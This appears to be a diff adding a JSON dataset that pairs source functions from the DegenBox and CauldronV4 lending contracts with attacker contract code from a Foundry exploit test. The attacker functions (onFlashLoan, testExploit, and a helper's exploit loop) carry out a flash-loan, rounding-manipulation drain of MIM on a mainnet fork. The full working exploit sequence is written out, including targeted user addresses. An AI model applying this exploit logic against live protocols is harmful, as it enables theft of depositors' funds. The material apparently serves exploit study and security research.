@@ -1,0 +1,184 @@
+[
+  {
+    "contract/interface": "IDegenBox",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address _owner) public constant returns (uint balance) {\n        return balances[_owner];\n    }\n\n}\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IDegenBox",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "    function deposit(\n        IERC20 token_,\n        address from,\n        address to,\n        uint256 amount,\n        uint256 share\n    ) public payable allowed(from) returns (uint256 amountOut, uint256 shareOut) {\n        // Checks\n        require(to != address(0), \"BentoBox: to not set\"); // To avoid a bad UI from burning funds\n\n        // Effects\n        IERC20 token = token_ == USE_ETHEREUM ? wethToken : token_;\n        Rebase memory total = totals[token];\n\n        // If a new token gets added, the tokenSupply call checks that this is a deployed contract. Needed for security.\n        require(total.elastic != 0 || token.totalSupply() > 0, \"BentoBox: No tokens\");\n        if (share == 0) {\n            // value of the share may be lower than the amount due to rounding, that's ok\n            share = total.toBase(amount, false);\n            // Any deposit should lead to at least the minimum share balance, otherwise it's ignored (no amount taken)\n            if (total.base.add(share.to128()) < MINIMUM_SHARE_BALANCE) {\n                return (0, 0);\n            }\n        } else {\n            // amount may be lower than the value of share due to rounding, in that case, add 1 to amount (Always round up)\n            amount = total.toElastic(share, true);\n        }\n\n        // In case of skimming, check that only the skimmable amount is taken.\n        // For ETH, the full balance is available, so no need to check.\n        // During flashloans the _tokenBalanceOf is lower than 'reality', so skimming deposits will mostly fail during a flashloan.\n        require(\n            from != address(this) || token_ == USE_ETHEREUM || amount <= _tokenBalanceOf(token).sub(total.elastic),\n            \"BentoBox: Skim too much\"\n        );\n\n        balanceOf[token][to] = balanceOf[token][to].add(share);\n        total.base = total.base.add(share.to128());\n        total.elastic = total.elastic.add(amount.to128());\n        totals[token] = total;\n\n        // Interactions\n        // During the first deposit, we check that this token is 'real'\n        if (token_ == USE_ETHEREUM) {\n            // X2 - If there is an error, could it cause a DoS. Like balanceOf causing revert. (SWC-113)\n            // X2: If the WETH implementation is faulty or malicious, it will block adding ETH (but we know the WETH implementation)\n            IWETH(address(wethToken)).deposit{value: amount}();\n        } else if (from != address(this)) {\n            // X2 - If there is an error, could it cause a DoS. Like balanceOf causing revert. (SWC-113)\n            // X2: If the token implementation is faulty or malicious, it may block adding tokens. Good.\n            token.safeTransferFrom(from, address(this), amount);\n        }\n        emit LogDeposit(token, from, to, amount, share);\n        amountOut = amount;\n        shareOut = share;\n    }\n\n    /// @notice Withdraws an amount of `token` from a user account.\n    /// @param token_ The ERC-20 token to withdraw.\n    /// @param from which user to pull the tokens.\n    /// @param to which user to push the tokens.\n    /// @param amount of tokens. Either one of `amount` or `share` needs to be supplied.\n    /// @param share Like above, but `share` takes precedence over `amount`.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IDegenBox",
+    "source_type": "victim_contract",
+    "function_name": "flashLoan",
+    "original_code": "    function flashLoan(\n        IFlashBorrower borrower,\n        address receiver,\n        IERC20 token,\n        uint256 amount,\n        bytes calldata data\n    ) public {\n        uint256 fee = amount.mul(FLASH_LOAN_FEE) / FLASH_LOAN_FEE_PRECISION;\n        token.safeTransfer(receiver, amount);\n\n        borrower.onFlashLoan(msg.sender, token, amount, fee, data);\n\n        require(_tokenBalanceOf(token) >= totals[token].addElastic(fee.to128()), \"BentoBox: Wrong amount\");\n        emit LogFlashLoan(address(borrower), token, amount, fee, receiver);\n    }\n\n    /// @notice Support for batched flashloans. Useful to request multiple different `tokens` in a single transaction.\n    /// @param borrower The address of the contract that implements and conforms to `IBatchFlashBorrower` and handles the flashloan.\n    /// @param receivers An array of the token receivers. A one-to-one mapping with `tokens` and `amounts`.\n    /// @param tokens The addresses of the tokens.\n    /// @param amounts of the tokens for each receiver.\n    /// @param data The calldata to pass to the `borrower` contract.\n    // F5 - Checks-Effects-Interactions pattern followed? (SWC-107)\n    // F5: Not possible to follow this here, reentrancy has been reviewed\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IDegenBox",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(\n        IERC20 token_,\n        address from,\n        address to,\n        uint256 amount,\n        uint256 share\n    ) public allowed(from) returns (uint256 amountOut, uint256 shareOut) {\n        // Checks\n        require(to != address(0), \"BentoBox: to not set\"); // To avoid a bad UI from burning funds\n\n        // Effects\n        IERC20 token = token_ == USE_ETHEREUM ? wethToken : token_;\n        Rebase memory total = totals[token];\n        if (share == 0) {\n            // value of the share paid could be lower than the amount paid due to rounding, in that case, add a share (Always round up)\n            share = total.toBase(amount, true);\n        } else {\n            // amount may be lower than the value of share due to rounding, that's ok\n            amount = total.toElastic(share, false);\n        }\n\n        balanceOf[token][from] = balanceOf[token][from].sub(share);\n        total.elastic = total.elastic.sub(amount.to128());\n        total.base = total.base.sub(share.to128());\n        // There have to be at least 1000 shares left to prevent reseting the share/amount ratio (unless it's fully emptied)\n        require(total.base >= MINIMUM_SHARE_BALANCE || total.base == 0, \"BentoBox: cannot empty\");\n        totals[token] = total;\n\n        // Interactions\n        if (token_ == USE_ETHEREUM) {\n            // X2, X3: A revert or big gas usage in the WETH contract could block withdrawals, but WETH9 is fine.\n            IWETH(address(wethToken)).withdraw(amount);\n            // X2, X3: A revert or big gas usage could block, however, the to address is under control of the caller.\n            (bool success, ) = to.call{value: amount}(\"\");\n            require(success, \"BentoBox: ETH transfer failed\");\n        } else {\n            // X2, X3: A malicious token could block withdrawal of just THAT token.\n            //         masterContracts may want to take care not to rely on withdraw always succeeding.\n            token.safeTransfer(to, amount);\n        }\n        emit LogWithdraw(token, from, to, amount, share);\n        amountOut = amount;\n        shareOut = share;\n    }\n\n    /// @notice Transfer shares from a user account to another one.\n    /// @param token The ERC-20 token to transfer.\n    /// @param from which user to pull the tokens.\n    /// @param to which user to push the tokens.\n    /// @param share The amount of `token` in shares.\n    // Clones of master contracts can transfer from any account that has approved them\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "HelperExploitContract",
+    "source_type": "attacker_contract",
+    "function_name": "exploit",
+    "original_code": "    function exploit() external {\n        CauldronV4.addCollateral(address(this), true, 100);\n        CauldronV4.borrow(address(this), 1);\n\n        uint8 i;\n        while (i < 90) {\n            CauldronV4.borrow(address(this), 1);\n            CauldronV4.repay(address(this), true, 1);\n            ++i;\n        }\n        CauldronV4.repay(address(this), true, 1);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "onFlashLoan",
+    "original_code": "    function onFlashLoan(\n        address initiator,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata data\n    ) external returns (bytes32) {\n        (uint128 elastic,) = CauldronV4.totalBorrow();\n        uint128 amount = uint128(uint128(elastic + uint128(50e18)) - uint128(240_000 * 1e18));\n\n        DegenBox.deposit(address(MIM), address(this), address(DegenBox), amount, 0);\n        MIM.transfer(address(CauldronV4), 240_000 * 1e18);\n        CauldronV4.repayForAll(uint128(240_000 * 1e18), true);\n\n        address[] memory users = new address[](15);\n        users[0] = 0x941ec857134B13c255d6EBEeD1623b1904378De9;\n        users[1] = 0x2f2A75279a2AC0C6b64087CE1915B1435b1d3ce2;\n        users[2] = 0x577BE3eD9A71E1c355f519BBDF5f09Ba2018b1Cc;\n        users[3] = 0xc3Be098f9594E57A3e71f485a53d990FE3961fe5;\n        users[4] = 0xEe64495BF9894f6c0A2Df4ac983581AADb87f62D;\n        users[5] = 0xe435BEbA6DEE3D6F99392ab9568777EB8165719d;\n        users[6] = 0xc0433E26E3D2Ae7D1D80E39a6D58062D1eAA54f5;\n        users[7] = 0x2c561aB0Ed33E40c70ea380BaA0dBC1ae75Ccd34;\n        users[8] = 0x33D778eD712C8C4AdD5A07baB012d1ce7bb0B4C7;\n        users[9] = 0x214BE7eBEc865c25c83DF5B343E45Aa3Bf8Df881;\n        users[10] = 0x3B473F790818976d207C2AcCdA42cb432b749451;\n        users[11] = 0x48ED01117a130b660272228728e07eF9efe21A30;\n        users[12] = 0x7E1C8fEF68a87F7BdDf4ae644Fe4D6e6362F5fF1;\n        users[13] = 0xD24cb02BEd630BAA49887168440D90BE8DA6708c;\n        users[14] = 0x0aB7999894F36eDe923278d4E898e78085B289e6;\n\n        uint8 i;\n        while (i < users.length) {\n            uint256 borrowPart = CauldronV4.userBorrowPart(users[i]);\n            if (borrowPart > 0) {\n                CauldronV4.repay(users[i], true, borrowPart);\n            }\n            ++i;\n        }\n        handleSpecialUser();\n\n        // Exchange portion of MIM balance for USDT\n        MIM_3LP3CRV.exchange_underlying(0, 3, 2000 * 1e18, 0);\n\n        // Add exchanged USDT amount as liquidity to the pool. Receive (mint) Crv3_USD_BTC_ETH in return\n        uint256[3] memory amounts;\n        amounts[0] = USDT.balanceOf(address(this));\n        amounts[1] = 0;\n        amounts[2] = 0;\n        // USDT_WBTC_WETH.add_liquidity(amounts, 0);\n        (bool success,) = address(USDT_WBTC_WETH).call(abi.encodeWithSelector(bytes4(0x4515cef3), amounts, 0));\n        require(success);\n\n        // yvCurve_3Crypto_f.deposit(Crv3_USD_BTC_ETH.balanceOf(address(this)));\n        (success,) = address(yvCurve_3Crypto_f).call(\n            abi.encodeWithSelector(bytes4(0xb6b55f25), Crv3_USD_BTC_ETH.balanceOf(address(this)))\n        );\n        require(success);\n\n        // Deposit yvCurve_3Crypto_f balance\n        uint256 depositAmount = yvCurve_3Crypto_f.balanceOf(address(this));\n        DegenBox.deposit(address(yvCurve_3Crypto_f), address(this), address(CauldronV4), depositAmount, 0);\n\n        HelperExploitContract helper = new HelperExploitContract();\n        // borrow and repay * 90x\n        helper.exploit();\n\n        CauldronV4.addCollateral(address(this), true, depositAmount - 100);\n        CauldronV4.borrow(address(this), DegenBox.balanceOf(address(MIM), address(CauldronV4)));\n        DegenBox.withdraw(\n            address(MIM), address(this), address(this), DegenBox.balanceOf(address(MIM), address(this)), 0\n        );\n\n        // Repaying flashloan\n        MIM.transfer(address(DegenBox), 300_000 * 1e18 + fee);\n        return keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 19_118_659);\n        vm.label(address(MIM), \"MIM\");\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(Crv3_USD_BTC_ETH), \"Crv3_USD_BTC_ETH\");\n        vm.label(address(yvCurve_3Crypto_f), \"yvCurve_3Crypto_f\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(DegenBox), \"DegenBox\");\n        vm.label(address(CauldronV4), \"CauldronV4\");\n        vm.label(address(MIM_3LP3CRV), \"MIM_3LP3CRV\");\n        vm.label(address(USDT_WBTC_WETH), \"USDT_WBTC_WETH\");\n        vm.label(address(MIM_USDC), \"MIM_USDC\");\n        vm.label(address(USDC_WETH), \"USDC_WETH\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"Exploiter MIM balance before attack\", MIM.balanceOf(address(this)), MIM.decimals());\n\n        emit log_named_decimal_uint(\n            \"Exploiter WETH balance before attack\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n\n        MIM.approve(address(DegenBox), type(uint256).max);\n        MIM.approve(address(MIM_3LP3CRV), type(uint256).max);\n        USDT.approve(address(USDT_WBTC_WETH), type(uint256).max);\n        Crv3_USD_BTC_ETH.approve(address(yvCurve_3Crypto_f), type(uint256).max);\n        yvCurve_3Crypto_f.approve(address(DegenBox), type(uint256).max);\n\n        DegenBox.flashLoan(address(this), address(this), address(MIM), 300_000 * 1e18, \"\");\n\n        // Exchange MIM to USDT\n        MIM_3LP3CRV.exchange_underlying(0, 2, 4_300_000 * 1e18, 0);\n\n        // Obtain USDC tokens\n        MIM_USDC.swap(address(this), true, 100_000 * 1e18, 75_212_254_740_446_025_735_711, \"\");\n\n        // Obtain WETH tokens\n        USDC_WETH.swap(\n            address(this),\n            true,\n            int256(USDC.balanceOf(address(this))),\n            1_567_565_235_711_739_205_094_520_276_811_199,\n            \"\"\n        );\n\n        emit log_named_decimal_uint(\"Exploiter MIM balance after attack\", MIM.balanceOf(address(this)), MIM.decimals());\n\n        emit log_named_decimal_uint(\n            \"Exploiter WETH balance after attack\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV3SwapCallback",
+    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        if (msg.sender == address(MIM_USDC)) {\n            MIM.transfer(address(MIM_USDC), uint256(amount0Delta));\n        } else {\n            USDC.transfer(address(USDC_WETH), uint256(amount0Delta));\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICauldronV4",
+    "source_type": "victim_contract",
+    "function_name": "addCollateral",
+    "original_code": "    function addCollateral(\n        address to,\n        bool skim,\n        uint256 share\n    ) public virtual {\n        userCollateralShare[to] = userCollateralShare[to].add(share);\n        uint256 oldTotalCollateralShare = totalCollateralShare;\n        totalCollateralShare = oldTotalCollateralShare.add(share);\n        _addTokens(collateral, share, oldTotalCollateralShare, skim);\n        _afterAddCollateral(to, share);\n        emit LogAddCollateral(skim ? address(bentoBox) : msg.sender, to, share);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICauldronV4",
+    "source_type": "victim_contract",
+    "function_name": "borrow",
+    "original_code": "    function borrow(address to, uint256 amount) public solvent returns (uint256 part, uint256 share) {\n        accrue();\n        (part, share) = _borrow(to, amount);\n    }\n\n    /// @dev Concrete implementation of `repay`.\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICauldronV4",
+    "source_type": "victim_contract",
+    "function_name": "repay",
+    "original_code": "    function repay(\n        address to,\n        bool skim,\n        uint256 part\n    ) public returns (uint256 amount) {\n        accrue();\n        amount = _repay(to, skim, part);\n    }\n\n    // Functions that need accrue to be called\n    uint8 internal constant ACTION_REPAY = 2;\n    uint8 internal constant ACTION_REMOVE_COLLATERAL = 4;\n    uint8 internal constant ACTION_BORROW = 5;\n    uint8 internal constant ACTION_GET_REPAY_SHARE = 6;\n    uint8 internal constant ACTION_GET_REPAY_PART = 7;\n    uint8 internal constant ACTION_ACCRUE = 8;\n\n    // Functions that don't need accrue to be called\n    uint8 internal constant ACTION_ADD_COLLATERAL = 10;\n    uint8 internal constant ACTION_UPDATE_EXCHANGE_RATE = 11;\n\n    // Function on BentoBox\n    uint8 internal constant ACTION_BENTO_DEPOSIT = 20;\n    uint8 internal constant ACTION_BENTO_WITHDRAW = 21;\n    uint8 internal constant ACTION_BENTO_TRANSFER = 22;\n    uint8 internal constant ACTION_BENTO_TRANSFER_MULTIPLE = 23;\n    uint8 internal constant ACTION_BENTO_SETAPPROVAL = 24;\n\n    // Any external call (except to BentoBox)\n    uint8 internal constant ACTION_CALL = 30;\n    uint8 internal constant ACTION_LIQUIDATE = 31;\n    uint8 internal constant ACTION_RELEASE_COLLATERAL_FROM_STRATEGY = 33;\n\n    int256 internal constant USE_VALUE1 = -1;\n    int256 internal constant USE_VALUE2 = -2;\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICauldronV4",
+    "source_type": "victim_contract",
+    "function_name": "repayForAll",
+    "original_code": "    function repayForAll(uint128 amount, bool skim) public returns(uint128) {\n        accrue();\n        \n        if(skim) {\n            // ignore amount and take every mim in this contract since it could be taken by anyone, the next block.\n            amount = uint128(magicInternetMoney.balanceOf(address(this)));\n            bentoBox.deposit(magicInternetMoney, address(this), address(this), amount, 0);\n        } else {\n            bentoBox.transfer(magicInternetMoney, msg.sender, address(this), bentoBox.toShare(magicInternetMoney, amount, true));\n        }\n\n        uint128 previousElastic = totalBorrow.elastic;\n\n        require(previousElastic - amount > 1000 * 1e18, \"Total Elastic too small\");\n\n        totalBorrow.elastic = previousElastic - amount;\n\n        emit LogRepayForAll(amount, previousElastic, totalBorrow.elastic);\n        return amount;\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICauldronV4",
+    "source_type": "victim_contract",
+    "function_name": "totalBorrow",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ICauldronV4",
+    "source_type": "victim_contract",
+    "function_name": "userBorrowPart",
+    "original_code": "",
+    "description": ""
+  }
+]
